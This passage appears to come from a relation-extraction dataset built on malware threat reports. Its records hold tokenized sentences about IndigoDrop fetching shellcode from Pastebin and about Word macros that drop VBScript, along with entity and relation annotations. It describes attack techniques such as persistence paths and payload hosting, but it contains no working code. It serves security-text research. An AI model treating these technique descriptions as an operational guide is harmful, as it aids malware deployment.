"attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"], ["The", "attackers", "used", "a", "combination", "of", "Pastebins", "and", "attacker-operated", "download", "servers", ",", "as", "backups", "if", "the", "pastes", "were", "removed", "."], ["Base64-encoded", "Pastebin", "and", "attacker-downloaded", "URL", "in", "an", "IndigoDrop", "sample", ":", "The", "evolution", "of", "attacks", "is", "illustrated", "here", ":", "ConclusionThis", "investigation", "illustrates", "an", "attacker", "using", "multiple", "tools", "and", "techniques", "to", "implement", "their", "full", "attack", "chain", "."], ["The", "attackers", "also", "use", "a", "combination", "of", "public", "and", "private", "servers", "to", "host", "their", "malicious", "payloads", "with", "a", "growing", "trend", "towards", "the", "sole", "usage", "of", "public", "servers", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "DLL", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "payload", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [15, 15], "name": "server", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "DLL", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "python code", "pos": [7, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "python27.dll library", "pos": [11, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [34, 34], "name": "shellcode", "pos": [3, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [42, 42], "name": "server", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [44, 44], "name": "Python code", "pos": [0, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "Python library", "pos": [5, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "Python code", "pos": [13, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "attackers", "pos": [23, 24], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [70, 70], "name": "pastebin.com", "pos": [26, 27], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "shellcode", "pos": [32, 33], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "IndigoDrop", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "capabilities", "pos": [12, 13], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "infection", "pos": [19, 20], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [117, 117], "name": "registry", "pos": [32, 33], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "IndigoDrop", "pos": [39, 40], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "shellcode", "pos": [43, 44], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [150, 150], "name": "attackers", "pos": [65, 66], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [153, 153], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "attackers", "pos": [1, 2], "index": "22_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [171, 171], "name": "servers", "pos": [10, 11], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [185, 185], "name": "URL", "pos": [4, 5], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [188, 188], "name": "IndigoDrop", "pos": [7, 8], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [194, 194], "name": "attacks", "pos": [13, 14], "index": "26_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [206, 206], "name": "tools", "pos": [25, 26], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [217, 217], "name": "attackers", "pos": [1, 2], "index": "28_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [226, 226], "name": "servers", "pos": [10, 11], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "payloads", "pos": [15, 16], "index": "30_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 9}, {"r": "ST", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "RF", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "EX", "evidence": [3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "RF", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [4], "h": 14, "t": 17}, {"r": "WR", "evidence": [4], "h": 15, "t": 17}, {"r": "RD", "evidence": [3, 4], "t": 13, "h": 16}, {"r": "RD", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 18, "t": 19}, {"r": "WR", "evidence": [4], "h": 20, "t": 21}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 20, "t": 22}, {"r": "ST", "evidence": [5], "h": 22, "t": 23}, {"r": "RF", "evidence": [5], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "t": 24, "h": 25}, {"r": "FR", "evidence": [6], "h": 26, "t": 27}, {"r": "ST", "evidence": [7], "h": 28, "t": 29}, {"r": "RF", "evidence": [7], "h": 28, "t": 29}, {"r": "RD", "evidence": [7], "h": 28, "t": 30}]}, {"title": "643-68", "sents": [["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"], ["The", "attackers", "used", "a", "combination", "of", "Pastebins", "and", "attacker-operated", "download", "servers", ",", "as", "backups", "if", "the", "pastes", "were", "removed", "."], ["Base64-encoded", "Pastebin", "and", "attacker-downloaded", "URL", "in", "an", "IndigoDrop", "sample", ":", "The", "evolution", "of", "attacks", "is", "illustrated", "here", ":", "ConclusionThis", "investigation", "illustrates", "an", "attacker", "using", "multiple", "tools", "and", "techniques", "to", "implement", "their", "full", "attack", "chain", "."], ["The", "attackers", "also", "use", "a", "combination", "of", "public", "and", "private", "servers", "to", "host", "their", "malicious", "payloads", "with", "a", "growing", "trend", "towards", "the", "sole", "usage", "of", "public", "servers", "."], ["For", "example", ",", "this", "attack", "consists", "of", "multiple", "shellcodes", "hosted", "on", "remote", "locations", "downloaded", "by", "a", "local", "component", "(", "IndigoDrop", ")", "during", "runtime", "to", "instrument", "the", "attack", "chain", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "DLL", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "python code", "pos": [7, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "python27.dll library", "pos": [11, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "shellcode", "pos": [3, 4], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [25, 25], "name": "server", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [27, 27], "name": "Python code", "pos": [0, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "Python library", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "Python code", "pos": [13, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "attackers", "pos": [23, 24], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [53, 53], "name": "pastebin.com", "pos": [26, 27], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "shellcode", "pos": [32, 33], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "IndigoDrop", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "capabilities", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "infection", "pos": [19, 20], "index": "13_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [100, 100], "name": "registry", "pos": [32, 33], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "IndigoDrop", "pos": [39, 40], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "shellcode", "pos": [43, 44], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [133, 133], "name": "attackers", "pos": [65, 66], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [136, 136], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [145, 145], "name": "attackers", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [154, 154], "name": "servers", "pos": [10, 11], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [168, 168], "name": "URL", "pos": [4, 5], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [171, 171], "name": "IndigoDrop", "pos": [7, 8], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [177, 177], "name": "attacks", "pos": [13, 14], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [189, 189], "name": "tools", "pos": [25, 26], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [200, 200], "name": "attackers", "pos": [1, 2], "index": "25_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [209, 209], "name": "servers", "pos": [10, 11], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [214, 214], "name": "payloads", "pos": [15, 16], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [231, 231], "name": "attack", "pos": [4, 5], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [235, 235], "name": "shellcodes", "pos": [8, 9], "index": "29_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [239, 239], "name": "locations", "pos": [12, 13], "index": "30_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [253, 253], "name": "attack chain", "pos": [26, 28], "index": "31_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 6}, {"r": "ST", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "RF", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "t": 7, "h": 8}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2], "h": 8, "t": 10}, {"r": "RD", "evidence": [3], "h": 11, "t": 14}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "RD", "evidence": [2, 3], "t": 10, "h": 13}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "WR", "evidence": [3], "h": 17, "t": 18}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 17, "t": 19}, {"r": "ST", "evidence": [4], "h": 19, "t": 20}, {"r": "RF", "evidence": [4], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "t": 21, "h": 22}, {"r": "FR", "evidence": [5], "h": 23, "t": 24}, {"r": "ST", "evidence": [6], "h": 25, "t": 26}, {"r": "RF", "evidence": [6], "h": 25, "t": 26}, {"r": "RD", "evidence": [6], "h": 25, "t": 27}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}, {"r": "ST", "evidence": [7], "h": 28, "t": 30}, {"r": "RF", "evidence": [7], "h": 28, "t": 30}, {"r": "RD", "evidence": [7], "t": 29, "h": 31}]}, {"title": "643-69", "sents": [["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"], ["The", "attackers", "used", "a", "combination", "of", "Pastebins", "and", "attacker-operated", "download", "servers", ",", "as", "backups", "if", "the", "pastes", "were", "removed", "."], ["Base64-encoded", "Pastebin", "and", "attacker-downloaded", "URL", "in", "an", "IndigoDrop", "sample", ":", "The", "evolution", "of", "attacks", "is", "illustrated", "here", ":", "ConclusionThis", "investigation", "illustrates", "an", "attacker", "using", "multiple", "tools", "and", "techniques", "to", "implement", "their", "full", "attack", "chain", "."], ["The", "attackers", "also", "use", "a", "combination", "of", "public", "and", "private", "servers", "to", "host", "their", "malicious", "payloads", "with", "a", "growing", "trend", "towards", "the", "sole", "usage", "of", "public", "servers", "."], ["For", "example", ",", "this", "attack", "consists", "of", "multiple", "shellcodes", "hosted", "on", "remote", "locations", "downloaded", "by", "a", "local", "component", "(", "IndigoDrop", ")", "during", "runtime", "to", "instrument", "the", "attack", "chain", "."], ["Cisco", "AMP", "users", "can", "use", "Orbital", "Advanced", "Search", "to", "run", "complex", "OSqueries", "to", "see", "if", "their", "endpoints", "are", "infected", "with", "this", "specific", "threat", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "shellcode", "pos": [3, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "server", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "Python code", "pos": [0, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Python library", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "Python code", "pos": [13, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "attackers", "pos": [23, 24], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [39, 39], "name": "pastebin.com", "pos": [26, 27], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "shellcode", "pos": [32, 33], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "IndigoDrop", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "capabilities", "pos": [12, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "infection", "pos": [19, 20], "index": "10_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [86, 86], "name": "registry", "pos": [32, 33], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "IndigoDrop", "pos": [39, 40], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [97, 97], "name": "shellcode", "pos": [43, 44], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [119, 119], "name": "attackers", "pos": [65, 66], "index": "14_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [122, 122], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [131, 131], "name": "attackers", "pos": [1, 2], "index": "16_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [140, 140], "name": "servers", "pos": [10, 11], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [154, 154], "name": "URL", "pos": [4, 5], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [157, 157], "name": "IndigoDrop", "pos": [7, 8], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [163, 163], "name": "attacks", "pos": [13, 14], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [175, 175], "name": "tools", "pos": [25, 26], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [186, 186], "name": "attackers", "pos": [1, 2], "index": "22_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [195, 195], "name": "servers", "pos": [10, 11], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [200, 200], "name": "payloads", "pos": [15, 16], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [217, 217], "name": "attack", "pos": [4, 5], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [221, 221], "name": "shellcodes", "pos": [8, 9], "index": "26_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [225, 225], "name": "locations", "pos": [12, 13], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [239, 239], "name": "attack chain", "pos": [26, 28], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [244, 244], "name": "users", "pos": [2, 3], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [247, 247], "name": "Orbital Advanced Search", "pos": [5, 8], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [253, 253], "name": "OSqueries", "pos": [11, 12], "index": "31_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [258, 258], "name": "endpoints", "pos": [16, 17], "index": "32_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "RD", "evidence": [2], "h": 8, "t": 11}, {"r": "WR", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [1, 2], "t": 7, "h": 10}, {"r": "RD", "evidence": [2], "h": 10, "t": 11}, {"r": "RD", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 12, "t": 13}, {"r": "WR", "evidence": [2], "h": 14, "t": 15}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 14, "t": 16}, {"r": "ST", "evidence": [3], "h": 16, "t": 17}, {"r": "RF", "evidence": [3], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "t": 18, "h": 19}, {"r": "FR", "evidence": [4], "h": 20, "t": 21}, {"r": "ST", "evidence": [5], "h": 22, "t": 23}, {"r": "RF", "evidence": [5], "h": 22, "t": 23}, {"r": "RD", "evidence": [5], "h": 22, "t": 24}, {"r": "RD", "evidence": [6], "h": 25, "t": 26}, {"r": "ST", "evidence": [6], "h": 25, "t": 27}, {"r": "RF", "evidence": [6], "h": 25, "t": 27}, {"r": "RD", "evidence": [6], "t": 26, "h": 28}, {"r": "FR", "evidence": [7], "h": 29, "t": 30}, {"r": "EX", "evidence": [7], "h": 30, "t": 31}]}, {"title": "14_g01-0", "sents": [["The", "campaign", "'s", "maldocs", "frequently", "carry", "a", "malevolent", "VBA", "macro", "that", "downloads", "and", "activates", "the", "next", "stage", "of", "the", "infection", "process", "."], ["Although", "the", "VBA", "macro", "opens", "automatically", ",", "it", "employs", "many", "VBA", "functions", "that", "register", "once", "the", "``", "Typing", "replaces", "selection", "''", "attribute", "is", "active", "in", "Microsoft", "Word", "."], ["The", "VBA", "functions", "activate", "when", "the", "victim", "inputs", "any", "content", "into", "the", "maldoc", "."], ["Hence", ",", "attackers", "disguise", "the", "maldocs", "as", "forms", "to", "encourage", "victims", "to", "enter", "content", "."], ["Malicious", "macro", "functions", "trigger", "when", "the", "target", "enters", "data", "in", "the", "maldoc", "form", "."], ["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "campaign", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "VBA macro", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "VBA macro", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "it", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "VBA functions", "pos": [10, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "Typing replaces selection", "pos": [17, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "VBA functions", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "attackers", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "maldocs", "pos": [5, 6], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [71, 71], "name": "forms", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "Malicious macro", "pos": [0, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "VBA code", "pos": [7, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "VBScript", "pos": [14, 15], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [123, 123], "name": "VBS", "pos": [3, 4], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 5}, {"r": "FR", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 13}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 7, "t": 9}, {"r": "RD", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 13}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "WR", "evidence": [6, 7], "t": 13, "h": 14}]}, {"title": "14_g01-1", "sents": [["Although", "the", "VBA", "macro", "opens", "automatically", ",", "it", "employs", "many", "VBA", "functions", "that", "register", "once", "the", "``", "Typing", "replaces", "selection", "''", "attribute", "is", "active", "in", "Microsoft", "Word", "."], ["The", "VBA", "functions", "activate", "when", "the", "victim", "inputs", "any", "content", "into", "the", "maldoc", "."], ["Hence", ",", "attackers", "disguise", "the", "maldocs", "as", "forms", "to", "encourage", "victims", "to", "enter", "content", "."], ["Malicious", "macro", "functions", "trigger", "when", "the", "target", "enters", "data", "in", "the", "maldoc", "form", "."], ["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "VBA macro", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "it", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "VBA functions", "pos": [10, 12], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [17, 17], "name": "Typing replaces selection", "pos": [17, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "VBA functions", "pos": [1, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "attackers", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "maldocs", "pos": [5, 6], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [49, 49], "name": "forms", "pos": [7, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "Malicious macro", "pos": [0, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "VBA code", "pos": [7, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "VBScript", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [94, 94], "name": "% Appdata % 